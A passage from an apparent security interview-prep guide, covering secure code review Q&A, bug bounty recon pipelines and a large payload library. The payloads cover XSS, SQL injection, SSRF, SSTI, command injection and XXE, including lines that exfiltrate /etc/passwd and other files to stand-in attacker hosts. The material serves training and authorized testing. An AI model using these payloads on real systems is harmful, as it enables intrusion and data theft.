+Node.js relies on a <strong>single-threaded Event Loop</strong> to execute JavaScript runtime execution asynchronously. When a regex pattern contains ambiguous repetition structures (such as `^(a+)+$`) and is evaluated against an attacker-supplied input string designed to trigger catastrophic backtracking, the CPU enters an exponential computational loop. Because JavaScript executes entirely upon the primary single event loop thread, this evaluation freezes the entire Node.js backend. During this blockage, no concurrent HTTP requests, database callbacks, or health-check routines can be serviced, causing an immediate app-wide Denial of Service (DoS).
+</details>
+
+<details>
+<summary><strong>Q3: In Python, why is the `pickle` module unsafe for processing untrusted data streams, and what mechanism actually executes arbitrary instructions?</strong></summary>
+<strong>Model Answer:</strong><br>
+Python's `pickle` serialization protocol is not merely a static JSON-like syntax; it constitutes a programmable serialization virtual machine bytecode language. When `pickle.loads()` processes an incoming payload, it deserializes objects by invoking instructions embedded directly in the data stream. If a Python class defines the special magic method <strong>`__reduce__(self)`</strong>, it instructs the pickle deserializer to summon a specific callable function accompanied by a tuple of arguments upon reconstruction. An attacker simply defines a class whose `__reduce__` method returns `(os.system, ('cat /etc/passwd',))`. As soon as `pickle.loads()` interprets this stream, the Operating System command executes before the application code even examines the reconstituted object.
+</details>
+
+<details>
+<summary><strong>Q4: Explain the distinction between syntactic static code matching and semantic code flaw analysis during a manual code review.</strong></summary>
+<strong>Model Answer:</strong><br>
+<strong>Syntactic structural matching</strong> focuses on explicit syntax patterns, function signatures, or keyword tokens within individual lines of code—such as searching for calls to `eval()`, `exec()`, or md5 hashing primitives. This level of checking is readily easily automated by grep scripts or linter-style SAST tools. 
+Conversely, <strong>semantic code analysis</strong> requires tracing comprehensive variable control and data flow across complex architectural execution boundaries to understand contextual application purpose. For instance, detecting an Insecure Direct Object Reference (IDOR) requires understanding semantic intent: recognizing that while `db.query('SELECT * FROM invoices WHERE id = ?', [req.params.id])` is syntactically immune to SQL Injection, it semanticly fails to verify if the currently authenticated session truly owns that invoice record. Human reviewers excel at evaluating semantic authorization logic and multi-step transaction flaws.
+</details>
+
+<details>
+<summary><strong>Q5: You encounter a developer who insists on using a custom encryption mechanism implemented over XOR and base64 formatting. How do you professionally explain why this fails during a code review?</strong></summary>
+<strong>Model Answer:</strong><br>
+In a constructive review, I would explain that **Base64 is strictly an encoding data-transport format**, offering absolutely zero cryptographic confidentiality against inspection. Furthermore, implementing a proprietary XOR cipher without modern cryptographic padding, authenticated integrity checking (such as HMAC or Galois Counter Mode), and robust random initial initialization vectors leaves the cipher vulnerable to known-plaintext attacks, key-reuse bit-flipping manipulation, and frequency statistical decryption. I would emphasize standard cryptographic doctrine: **"Never implement homegrown cryptography."** I would then guide them toward authenticated encryption suites like **AES-256-GCM** or high-level modern constructs provided by validated ecosystem libraries (such as Python's `cryptography.fernet` or Google's Tink library).
+</details>
+
+<details>
+<summary><strong>Q6: When reviewing JavaScript/DOM application frontend code, what are the primary dangerous sinks to scrutinize for DOM-based Cross-Site Scripting (XSS)?</strong></summary>
+<strong>Model Answer:</strong><br>
+In DOM-based XSS analysis, we trace execution from **Sources** (user-controllable input channels such as `window.location.hash`, `window.location.search`, `document.referrer`, and web messaging payloads) directly into dangerous execution **Sinks**. During code reviews, the highest priority JavaScript DOM sinks to scrutinize include:
+1. **Direct HTML Node Injection:** `element.innerHTML`, `element.outerHTML`, and `document.write()`.
+2. **Code Execution Primitives:** `eval()`, `setTimeout(string, ...)`, and `setInterval(string, ...)`.
+3. **URL Navigation Execution Sinks:** Assigning untrusted string input into `window.location`, `location.href`, or anchor `a.href` structures, which permits executing javascript pseudo-protocol expressions (e.g., `javascript:alert(1)`).
+</details>
+
+
+---
+
+<a id="section-10_bug_bounty_recon"></a>
+# 🎯 10: Bug Bounty Methodology & Offensive Reconnaissance
+
+In modern product-focused enterprises (particularly fast-moving tech startups and fintech organizations like Razorpay, CRED, Stripe, or Zerodha), security engineering goes beyond simple scanner operation. AppSec engineers must possess an offensive **"Bug Bounty Methodology"** mindset—understanding precisely how external offensive researchers map large attack surfaces, uncover hidden assets, and chain vulnerabilities together.
+
+This module details both the **conceptual offensive discovery pipeline** and the concrete **command-line tooling execution workflows** used by top bug bounty hunters and Red Teams today.
+
+---
+
+## 1. The Full Scope Reconnaissance Pipeline
+
+When targeting an enterprise with broad infrastructure scopes (e.g., `*.example.com` or autonomous cloud ranges), high-impact discovery follows a disciplined five-stage funnel:
+
+```
++-------------------------------------------------------------------------+
+| [Stage 1] Passive & Active Subdomain Enumeration (Subfinder, Amass)     |
++-------------------------------------------------------------------------+
+                                    │
+                                    ▼
++-------------------------------------------------------------------------+
+| [Stage 2] DNS Validation & Service Port Discovery (dnsx, Naabu)        |
++-------------------------------------------------------------------------+
+                                    │
+                                    ▼
++-------------------------------------------------------------------------+
+| [Stage 3] HTTP Probing, Tech Stack Profiling & Screenshotting (httpx)  |
++-------------------------------------------------------------------------+
+                                    │
+                                    ▼
++-------------------------------------------------------------------------+
+| [Stage 4] Deep Content Fuzzing & Historical Archive Mining (ffuf, gau) |
++-------------------------------------------------------------------------+
+                                    │
+                                    ▼
++-------------------------------------------------------------------------+
+| [Stage 5] Targeted Vulnerability Scanning & Manual Deep Dive (Nuclei)   |
++-------------------------------------------------------------------------+
+```
+
+---
+
+## 2. Practical Tool Command Pipelines
+
+Below are essential command-line pipelines for offensive reconnaissance. Modern tools are predominantly built in **Go** due to high concurrency performance and memory efficiency.
+
+### Stage 1: Subdomain Discovery
+We blend passive OSINT intelligence sources (Certificate Transparency logs, DNS databases, Whois records) with active permutations to build our comprehensive subdomain inventory.
+
+```bash
+# 1. Fast passive subdomain discovery across multiple public APIs using Subfinder
+subfinder -d example.com -all -silent -o subdomains_subfinder.txt
+
+# 2. Deep recursive infrastructure mapping with OWASP Amass
+amass enum -passive -d example.com -o subdomains_amass.txt
+
+# 3. Combine, sort, and deduplicate discovered asset listings
+cat subdomains_*.txt | sort -u > unique_subdomains.txt
+```
+
+---
+
+### Stage 2: DNS Resolution & Port Probing
+Before launching web requests, verify which discovered domains have active DNS A/CNAME records and open TCP ports beyond standard HTTP (80/443).
+
+```bash
+# 1. Resolve raw domain lists to live IP mappings and eliminate non-resolving junk (dnsx)
+cat unique_subdomains.txt | dnsx -silent -a -resp -o resolved_hosts.txt
+
+# 2. Fast multi-threaded TCP port scanning for common microservice ports using Naabu
+cat unique_subdomains.txt | naabu -top-ports 100 -silent -o open_ports.txt
+```
+
+---
+
+### Stage 3: Live HTTP Probing & Profiling
+Transform raw socket addresses and hostnames into validated web server application URLs, capturing status codes, titles, and underlying application frameworks.
+
+```bash
+# 1. Probe for HTTP/HTTPS accessibility, extract status codes, server headers, and titles (httpx)
+cat unique_subdomains.txt | httpx -silent -status-code -title -tech-detect -o alive_http_targets.txt
+
+# 2. Filter target output specifically for live application portals running administrative status codes
+cat unique_subdomains.txt | httpx -silent -match-code 200,301,302,403 -o targets_ready_for_fuzzing.txt
+```
+
+---
+
+### Stage 4: Directory, Parameter & Archive Mining
+Discover hidden REST endpoints, legacy staging directories, administration consoles, and forgotten background parameters.
+
+```bash
+# 1. Fast multi-threaded directory fuzzer to discover unlinked application content (ffuf)
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u https://api.example.com/FUZZ -mc 200,204,301,302,307,401,403 -t 50
+
+# 2. Extract historical URLs cached in Google, AlienVault OTX, and Wayback Machine via gau (Get All Urls)
+cat targets_ready_for_fuzzing.txt | gau --threads 5 >> archive_urls.txt
+
+# 3. Discover hidden GET/POST API parameter names via response difference analysis (Arjun)
+arjun -u https://api.example.com/v1/user -m GET -c 10 -oJ parameters.json
+```
+
+---
+
+### Stage 5: Template Vulnerability Scanning (Nuclei)
+Execute rapid, reproducible vulnerability scanning across thousands of endpoints utilizing YAML-based community vulnerability templates.
+
+```bash
+# 1. Scan verified live targets against critical known CVEs, exposed configuration panels, and token leaks
+cat targets_ready_for_fuzzing.txt | nuclei -t cves/ -t exposed-panels/ -t default-logins/ -severity critical,high -o vuln_scan_results.txt
+
+# 2. Run highly specialized custom templates checking for organization-specific API regressions
+nuclei -l targets_ready_for_fuzzing.txt -t /custom-templates/fintech-auth-bypass.yaml
+```
+
+---
+
+## 3. High-Yield Bug Hunting Targets (Fintech & APIs)
+
+While simple scanners frequently uncover forgotten backup files or misconfigured headers, million-dollar enterprise bug bounties reward deep manual analysis of custom business architectures. When evaluating target ecosystems, prioritize these high-yield areas:
+
+### 1. Insecure Direct Object References (IDOR / BOLA)
+- **What to test:** Swap numeric ID IDs (`/api/v1/orders/10045`) with UUID representations, test array wrapping (`/api/v1/orders/[10045, 10046]`), or substitute parameter names (`user_id` vs `account_id`).
+- **Why it matters in Fintech:** Unauthorized retrieval of financial invoices, transaction receipts, or KYC identification docs represents an immediate Critical severity rating.
+
+### 2. Business Logic & Multistep Workflow Flaws
+- **What to test:** Skip verification steps in a checkout funnel (e.g., skip stage 2 OTP PIN validation and invoke `/api/v2/transfer/complete` directly with a spoofed transaction token).
+- **Why it matters:** Automated vulnerability scanners understand HTTP status codes, but they lack human logical inference; scanners will never know that buying a ₹5,000 iPhone by manipulating quantity parameters to negative values (`quantity = -1` to receive refund credit) violates commercial intent!
+
+### 3. Concurrency Race Conditions
+- **What to test:** Fire 50 simultaneous identical POST HTTP requests using tools like **Turbo Intruder** or **Burp Suite Repeater Parallel Group Delivery** against financial coupon withdrawal, point redemption, or promotional gift card code validation endpoints.
+- **Why it matters:** If the backend database checks an account balance before locking the balance record during subtraction updates, rapid parallel execution causes duplicate redemption payouts before state persistence occurs.
+
+---
+
+## 4. Crafting High-Impact Vulnerability Reports
+
+Even the most sophisticated zero-day chain risks rejection or triage deferral if communicated poorly. A high-quality security vulnerability bug report follows this structured formatting standard:
+
+```markdown
+# [High] Insecure Direct Object Reference in /v2/statements allows unauthorized downloading of arbitrary user bank PDFs
+
+## 1. Vulnerability Overview
+Briefly state the flaw category, the affected application endpoint URL, and the core operational risk.
+
+## 2. Severity & Impact Analysis
+- **CVSS v3.1 Score:** 7.5 (High) [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N]
+- **Business Impact:** Any authenticated low-privilege banking user can inspect and exfiltrate highly sensitive monthly financial PDF account statements belonging to any other platform user simply by modifying the target numeric sequence ID in the GET URL structure.
+
+## 3. Prerequisites & Test Environment
+- An active verified user account (Attacker User ID: 88419, Email: test_attacker@mail.com)
+- Target victim user statement ID (Victim Statement ID: 10452)
+
+## 4. Step-by-Step Reproduction Proof of Concept (PoC)
+1. Log into the financial dashboard using normal credentials as Attacker User ID 88419.
+2. Navigate to the Account Statements module and intercept the outgoing statement request using Burp Suite.
+3. Observe the generated request GET parameter: `https://api.fintech.com/v2/statements?id=88419_MAY_2026.pdf`.
+4. Send the captured request to Burp Repeater and modify the sequence parameter value to targeted victim file `id=10452_MAY_2026.pdf`.
+5. Observe that the HTTP server responds with a `200 OK` status and serves the unmasked binary contents of Victim User 10452's bank statement without checking resource ownership credentials.
+
+## 5. Remediation Recommendation
+Implement strict authorization enforcement checks on the background service provider. When handling `/v2/statements`, extract the authenticated user session subject token directly from the validated JWT or session state, ensuring the requested document record explicitly belongs to the authenticated user token ID prior to streaming filesystem read blobs.
+```
+
+---
+
+## 🎤 Interview Questions & Model Answers
+
+<details>
+<summary><strong>Q1: Why is passive subdomain enumeration conducted before active probing or brute-force scanning during offensive reconnaissance?</strong></summary>
+<strong>Model Answer:</strong><br>
+<strong>Passive reconnaissance</strong> extracts operational domain infrastructure details entirely from public third-party historical databases, Certificate Transparency log servers (like `crt.sh`), and external search indexers without ever transmitting direct networking packet traffic to the target's corporate IP ranges. Because no interaction occurs directly against the target organization's server infrastructure, passive enumeration leaves zero logging fingerprints on internal enterprise Intrusion Detection Systems (IDS), Web Application Firewalls (WAF), or SIEM monitoring pipelines. Performing exhaustive passive discovery first avoids triggering rate-limiting defensive bans or triggering SoC alerts prematurely, while providing a comprehensive structural map before executing targeted active engagement maneuvers.
+</details>
+
+<details>
+<summary><strong>Q2: When chaining vulnerabilities, explain how an seemingly low-severity SSRF vulnerability can transform into an immediate High or Critical severity RCE or Cloud Account Compromise.</strong></summary>
+<strong>Model Answer:</strong><br>
+In modern containerized and cloud-native server environments (such as AWS, GCP, or Azure), virtual server instances implicitly trust network inquiries directed toward local **Cloud Instance Metadata Services (IMDS)** typically situated at the non-routable link-local IP address `169.254.169.254`. If an application suffers from even a seemingly minor blind or basic SSRF flaw that allows fetching internal HTTP endpoints, an attacker can manipulate the target URL parameter to request:
+`http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM-Role-Name>/`. 
+When the vulnerable application server fetches this URL and returns the output to the attacker, it discloses temporary **AWS Access Key IDs, Secret Access Keys, and Session Tokens** assigned directly to the running EC2 server role. If that IAM role possesses elevated infrastructure permission policies (e.g., S3 read/write or EC2 deployment capabilities), the offensive actor immediately pivots from a basic localized application defect to a comprehensive full cloud architecture compromise.
+</details>
+
+<details>
+<summary><strong>Q3: Explain the mechanical differences between horizontal privilege escalation and vertical privilege escalation, providing a classic bug bounty example for each.</strong></summary>
+<strong>Model Answer:</strong><br>
+<strong>Horizontal Privilege Escalation</strong> occurs when an authenticated user gains unauthorized access to resources, files, or execution state owned by another peer user holding the exact same institutional role or security classification level. 
+*Example:* A normal customer changing a parameter from `/view_profile?user_id=100` to `/view_profile?user_id=101`, thereby reading another customer's private data (classic IDOR/BOLA).
+
+<strong>Vertical Privilege Escalation</strong> occurs when a standard low-privilege user abuses application flaws to elevate structural system authority, obtaining execution permissions typically reserved solely for higher-tiered roles such as Site Administrators or Superusers.
+*Example:* An attacker signing up for a basic free demo account and abusing a **Mass Assignment / Parameter Binding flaw** during registration by appending `"is_admin": true` directly into the JSON POST payload, which an unprotected database model merges directly into user permissions, granting complete administrative control.
+</details>
+
+<details>
+<summary><strong>Q4: Why do vulnerability triagers place heavy importance on distinguishing between theoretical vulnerability presence and documented functional "Impact"?</strong></summary>
+<strong>Model Answer:</strong><br>
+Security Engineering Teams and bug bounty triagers operate under severe vulnerability prioritization workflows; simply identifying an unusual behavioral aberration or a low-risk header misconfiguration (such as a missing framing security header or displaying verbose software build numbers) provides negligible actionable context regarding real enterprise danger. Triagers require documented **Functional Business Impact**, which clearly illustrates precisely what realistic catastrophe an attacker can achieve by executing the vulnerability under practical production conditions. Demonstrating impact transforms an academic debate into quantifiable corporate risk analysis (such as proving how an apparent innocent reflected XSS vuln chains into executing complete account takeover over financial support dashboards via cookie stealing or CSRF token capture).
+</details>
+
+<details>
+<summary><strong>Q5: What is "Parameter Pollution" in web applications, and how can an AppSec tester leverage it to bypass authentication or defensive WAF filtering rules?</strong></summary>
+<strong>Model Answer:</strong><br>
+<strong>HTTP Parameter Pollution (HPP)</strong> arises when an attacker submits multiple instances of the exact same parameter key within a single HTTP request transmission (for example: `https://app.com/api?user=admin&user=test_user`). Different application web backend engines handle duplicated parameters in contradictory ways: some engines only process the first encountered occurrence (Java/JSP), some exclusively respect the final occurrence (PHP/Apache, Python/Flask), while others automatically combine values into a concatenated array or comma-delimited sequence (ASP.NET, Node.js/Express). 
+An AppSec tester can weaponize this structural mismatch to bypass inline Web Application Firewalls (WAF): if an inline defensive firewall only checks the first incoming query token (`?user=safe_user`) for illegal payloads, but the terminal backend microservice parses exclusively the last token (`&user=admin' OR 1=1--`), the attacker effortlessly sneaks a critical injection payload straight through the perimeter defenses!
+</details>
+
+
+---
+
+<a id="section-11_payload_library"></a>
+# 📦 11: The AppSec Tester's Payload Reference Library
+
+This repository contains an exhaustive collection of high-probability verification payloads, syntax bypass techniques, and polyglots designed for practical offensive discovery during security assessments, authorized pentests, and interactive lab sessions (such as PortSwigger Web Security Academy or HackTheBox).
+
+---
+
+## 1. Cross-Site Scripting (XSS) Payloads
+
+### Classic Proof of Concept (PoC) & Event Handlers
+When injecting into basic unencoded HTML reflection points or testing DOM manipulation primitives, utilize direct event handler execution vectors:
+```html
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<input type="text" autofocus onfocus="alert(1)">
+<video src=x onerror=alert(1)></video>
+<details open ontoggle=alert(1)>
+```
+
+### Attribute Exit & String Breakout Injection
+When user input is reflected inside an existing HTML attribute or JavaScript variable quotation string:
+```javascript
+// Breaking out of standard HTML attributes (e.g., <input value="YOUR_INPUT">)
+" autofocus onfocus="alert(1)
+" onclick="alert(1)" "
+'>><script>alert(1)</script>
+
+// Breaking out of inline JavaScript variable assignments (e.g., var name = 'YOUR_INPUT';)
+'-alert(1)-'
+'; alert(1); //
+\'; alert(1); //
+</script><script>alert(1)</script>
+```
+
+### WAF Filter Bypass & Polyglot Constructs
+When inline filters actively block common scripting tokens, case-sensitive tags, or spaces:
+```html
+<!-- Bypassing space prohibitions using solidus (/) or tab encoding -->
+<img/src="x"/onerror=alert(1)>
+<svg/onload=alert(1)>
+<a/href="javascript:alert(1)">Click Here</a>
+
+<!-- Case obfuscation against poorly written regular expression matchers -->
+<sCrIpt>alert(1)</ScRiPt>
+<iMg SrC=X oNeRrOr=alert(1)>
+
+<!-- Ultimate Multi-Context XSS Polyglot (Break out of quotes, tags, scripts, and attributes at once) -->
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0D%0A//</stYle/</titLe/</teXtariA/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
+```
+
+---
+
+## 2. SQL Injection (SQLi) Payloads
+
+### Basic Authentication Bypass (Login Gate Testing)
+```sql
+' OR 1=1--
+' OR '1'='1
+' OR 1=1#
+' OR '1'='1'/*
+admin'--
+admin' #
+' or 1=1 limit 1--
+") OR ("1"="1
+```
+
+### UNION-Based Data Exfiltration
+When determining column counts and pulling database tables through visible HTML application outputs:
+```sql
+-- Step 1: Discovering order of column indexes
+' ORDER BY 1--
+' ORDER BY 5--
+' ORDER BY 10-- (Keep incrementing until Database Syntax Error occurs)
+
+-- Step 2: Extracting system user, version, and current schema data
+' UNION SELECT null, null, null--
+' UNION SELECT user(), @@version, database()-- (MySQL / Microsoft SQL Server)
+' UNION SELECT user, version(), current_database() FROM pg_stat_activity-- (PostgreSQL)
+' UNION SELECT user, banner, 'test' FROM v$version-- (Oracle Database - requires explicit FROM clause)
+```
+
+### Time-Based Blind SQLi (Asynchronous Validation)
+When database error outputs are masked and query results generate zero visible frontend display alterations, test execution time delays:
+```sql
+-- MySQL Sleep Primitive
+' OR SLEEP(10)--
+' UNION SELECT SLEEP(10)--
+' AND (SELECT * FROM (SELECT(SLEEP(10)))a)--
+
+-- PostgreSQL Time Delay
+' OR pg_sleep(10)--
+'; SELECT pg_sleep(10);--
+' AND (SELECT pg_sleep(10))--
+
+-- Microsoft SQL Server (MSSQL) Wait-for Command
+'; WAITFOR DELAY '0:0:10'--
+' OR IF(1=1) WAITFOR DELAY '0:0:10'--
+
+-- Oracle SQL Performance Loop
+' OR dbms_pipe.receive_message(('a'),10)=1--
+```
+
+---
+
+## 3. Server-Side Request Forgery (SSRF) Payloads
+
+### Cloud Instance Metadata Harvesting (IMDS Vulnerability Probing)
+When targeting application backend functions that retrieve internal network resources (such as webhooks, export services, image downloaders, or PDF generators):
+```http
+# Amazon Web Services (AWS EC2 Metadata Endpoint v1 & v2 Probes)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+
+# Google Cloud Platform (GCP Compute Engine Metadata Service - requires header bypass)
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
+# Note: Frequently requires bypassing HTTP header constraints by injecting header manipulation payloads
+
+# Microsoft Azure Resource Metadata
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+```
+
+### Internal Localhost Targeting & WAF IP Obfuscation
+When security filters explicitly blacklist occurrences of `127.0.0.1`, `localhost`, or internal RFC 1918 networking subnets:
+```http
+# Alternate Numerical IP Representation Techniques
+http://0.0.0.0:80/
+http://127.0.0.1:8080/
+http://2130706433/ (Decimal Integer Representation of 127.0.0.1)
+http://0x7f000001/ (Hexadecimal Notation Address)
+http://0177.0000.0000.0001/ (Octal Numeric Formatting)
+http://127.1/ (Shortened Class-A IP Traling Resolution)
+
+# DNS Resolution Redirection
+http://localtest.me/ (Public external DNS hostname natively resolving to 127.0.0.1)
+http://spoofed.burpcollaborator.net/ (External redirector that throws a 301 Redirect to 127.0.0.1 after passing preliminary WAF inspections)
+
+# Protocol Smuggling & Alternative Schemes
+file:///etc/passwd
+dict://127.0.0.1:11211/stat
+gopher://127.0.0.1:25/xHELO%20localhost%250D%250A
+```
+
+---
+
+## 4. Server-Side Template Injection (SSTI) Payloads
+
+### SSTI Engine Identification Reference Chart
+When input values reflect cleanly without sanitization, use diagnostic expressions to identify the underlying rendering templating framework:
+```
+                ${7*7}
+               /      \
+            (49)      (${7*7})
+            /            \
+     {{7*7}}           {{7*'7'}}
+     /     \            /      \
+  (49)   (Other)   (7777777)  (49)
+  /         \        /          \
+Twig    Thymeleaf  Jinja2     Python Mako
+```
+
+### Execution & Remote Code Generation Payloads
+```jinja2
+# Python (Jinja2 / Flask / Tornado RCE payload primitives)
+{{7*7}}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ config.items() }}
+{{ "".__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate() }}
+
+# Java (Thymeleaf, Spring Boot Expression Language / SpEL)
+${7*7}
+__${new java.lang.ProcessBuilder('id').start()}__
+${T(java.lang.Runtime).getRuntime().exec("cat /etc/passwd")}
+
+# PHP (Twig / Smarty Engine)
+{{7*7}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{php}echo `id`;{/php}
+
+# Ruby (ERB / Ruby on Rails)
+<%= 7*7 %>
+<%= `id` %>
+<%= system('cat /etc/passwd') %>
+```
+
+---
+
+## 5. Command Injection & OS Execution Payloads
+
+When appending payloads to command line interfaces or string concatenation targets:
+```bash
+# Basic Linux System Execution Operators
+; id
+| id
+|| id
+& id
+&& id
+`id`
+$(id)
+
+# Out-of-Band (OOB) Exfiltration & Blind Blind Timing Delays
+; sleep 10 ;
+| sleep 10
+`ping -c 10 127.0.0.1`
+; curl http://collaborator-token.burpcollaborator.net/`whoami` ;
+| wget http://attacker.com/$(cat /etc/passwd | base64 -w 0)
+```
+
+---
+
+## 6. Path Traversal & Local File Inclusion (LFI) Payloads
+
+### Unix / Linux Operating System File Extraction
+```http
+../../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/shadow
+../../../../../../../../../../etc/hosts
+../../../../../../../../../../root/.bash_history
+../../../../../../../../../../proc/self/environ (Can be leveraged for User-Agent LFI log poisoning RCE!)
+/var/log/apache2/access.log
+```
+
+### Microsoft Windows File Retrieval Payloads
+```http
+../../../../../../../../../../windows/win.ini
+../../../../../../../../../../windows/system32/drivers/etc/hosts
+../../../../../../../../../../boot.ini
+C:\Windows\System32\drivers\etc\hosts
+```
+
+### Path Encoding & Bypass Variations
+```http
+..%2f..%2f..%2f..%2f..%2fetc%2fpasswd (Url Encoding)
+..%252f..%252f..%252f..%252f..%252fetc%252fpasswd (Double Url Encoding)
+..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd (Overlong UTF-8 Unicode Bypass)
+....//....//....//....//etc/passwd (Recursive stripping bypass)
+/var/www/uploads/../../../../../../etc/passwd%00.png (Null Byte String Termination - bypasses required file extension checks in older architectures!)
+```
+
+---
+
+## 7. XML External Entity (XXE) Injection Payloads
+
+### Classic File Exfiltration Entity Declaration
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
+]>
+<user>
+  <username>&xxe;</username>
+  <password>test</password>
+</user>
+```
+
+### Blind OOB (Out-Of-Band) DTD Exfiltration via External Server
+```xml
+<!-- Primary malicious XML document submitted directly to target parsing API -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+  <!ENTITY % remote SYSTEM "http://attacker-controlled-server.com/malicious.dtd">
+  %remote;
+  %send;
+]>
+<data>4</data>
+
+<!-- External malicious.dtd file hosted upon Attacker-Controlled Server -->
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker-controlled-server.com/?exf=%file;'>">
+%eval;
+```
+
+---
+
+## 🎤 Interview Questions & Model Answers
+
+<details>
+<summary><strong>Q1: Why does replacing `127.0.0.1` with a decimal representation like `2130706433` successfully bypass basic WAF SSRF blacklist implementations while still connecting to local interfaces?</strong></summary>
+<strong>Model Answer:</strong><br>
+Standard Web Application Firewalls and custom regex validators often perform simplistic syntax pattern evaluations by string matching explicitly against `"127.0.0.1"` or `"localhost"`. However, when an underlying networking client or socket library (such as Linux `cURL`, Python's `urllib`, or Java's `InetAddress.getByName()`) executes systemic hostname resolution routines, it delegates IP expression evaluation directly to standard operating system networking system calls like `inet_aton()`. These low-level POSIX primitives natively recognize four discrete IPv4 notation syntaxes: standard dotted-decimal, octal array, hexadecimal string, and single 32-bit **Unsigned Decimal Integer representations**. Consequently, passing `http://2130706433/` glides cleanly around naive regex string blocking, after which the OS kernel silently translates the integer parameter straight into binary socket endpoint address `127.0.0.1`.
+</details>
+
+<details>
+<summary><strong>Q2: During a SQL injection evaluation, what distinguishes a UNION-based injection exploit from a Boolean-blind injection exploit in terms of technical performance and efficiency?</strong></summary>
+<strong>Model Answer:</strong><br>
+In a **UNION-based injection exploit**, an attacker successfully piggybacks a second custom SELECT query syntax directly onto the legitimate output result array, enabling instant extraction of complete database tables, user listings, and password hashes displayed straight onto standard HTML application interface responses. This achieves extremely rapid, high-efficiency data exfiltration in mere dozens of request exchanges. 
+Conversely, in a **Boolean-blind SQL injection**, application interfaces hide actual query results entirely, merely altering generic response characteristics (e.g., displaying a "Record found" page versus an "Item missing" page) depending upon whether an injected SQL logical assertion evaluates to True or False. To exfiltrate secure records under Boolean-blind constraints, an attacker must evaluate target data strictly character-by-character using ASCII byte bifurcation loops (`WHERE ascii(substring((SELECT password),1,1)) > 64`), requiring hundreds or thousands of high-latency automated individual HTTP query transmissions per extracted database credential!
+</details>
+
+<details>
+<summary><strong>Q3: Explain how "Out-of-Band" (OOB) vulnerability exploitation operates, and identify why DNS interactions represent the most resilient interaction protocol when capturing OOB evidence.</strong></summary>
+<strong>Model Answer:</strong><br>
+<strong>Out-of-Band (OOB) exploitation</strong> relies on instructing an affected target infrastructure backend to instantiate an asynchronous network communication connection outward toward an external, monitoring server managed entirely by the attacker (such as PortSwigger Burp Collaborator or project Discovery interactsh). This technique proves invaluable whenever standard HTTP response pathways suppress error messages or mask command outputs completely (Blind RCE, Blind XXE, Blind SSRF).
+Within OOB engagements, **DNS (Domain Name System) interactions** provide the highest transmission resilience because corporate enterprise firewalls, egress proxy restrictions, and WAF perimeter blocks aggressively restrict outbound direct HTTP, SSH, or TCP port connections initiated by application servers. Nevertheless, servers routinely remain allowed to query local network resolver infrastructures to translate target external DNS query syntax, which automatically forwards recursive query packet headers out toward public authoritative root nameservers—reliably delivering encoded target payload proofs directly to the attacker's DNS monitoring instrumentation regardless of internal firewall network segregation!
+</details>
+
+<details>
+<summary><strong>Q4: Why does appending `%00` (Null Byte Termination) bypass legacy file extension validators during Local File Inclusion (LFI) or Arbitrary File Upload assessments?</strong></summary>
+<strong>Model Answer:</strong><br>
+In legacy runtime platforms (most famously PHP versions prior to v5.3.4, older Java virtual machines, and classic Perl CGI architectures), application logic routinely verifies user file strings using high-level string evaluation functions (like checking if a filename explicitly ends with `.jpg` or `.pdf` before permitting access). However, when the interpreted programming runtime ultimately hands off the validated string variable down to low-level C system runtime interfaces (such as POSIX filesystem primitives like `fopen` or `include`), standard C language conventions designate the hex byte token `0x00` (`%00` or `\0`) as the absolute structural **Null Character String Terminator**. 
+When an attacker submits `../../../../etc/passwd%00.png`, higher-level evaluation routines validate the concluding `.png` extension and authorize the operation. But upon transmission into underlying kernel-level C file reading execution routines, processing immediately terminates reading upon encountering the `%00` byte, forcing the system runtime to load and output the target operating system parameter `/etc/passwd` directly!
+</details>
+
+
+---
+
+<a id="section-12_lab_tracker"></a>
+# 🧪 12: PortSwigger Web Security Academy Lab Tracker
+
+The **PortSwigger Web Security Academy** is the gold standard for hands-on web vulnerability training. During Technical Rounds at companies like Flipkart, Razorpay, CRED, or offensive consultancies, interviewers frequently ask you to explain solving methodologies for specific PortSwigger labs.
+
+Use this structured interactive checklist to track your lab completion progress across your 18-week learning journey. Because this HTML learning platform syncs check state directly with your local browser storage (`localStorage`), you can check items off as you conquer each challenge!
+
+---
+
+## 1. Cross-Site Scripting (XSS)
+
+### 🟢 Apprentice Level
+- [ ] **Reflected XSS:** [Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
+- [ ] **Stored XSS:** [Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
+- [ ] **DOM XSS:** [DOM-based XSS in `document.write` sink using source `location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
+- [ ] **DOM XSS:** [DOM-based XSS in `innerHTML` sink using source `location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)
+
+### 🟡 Practitioner Level
+- [ ] **Reflected XSS:** [Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)
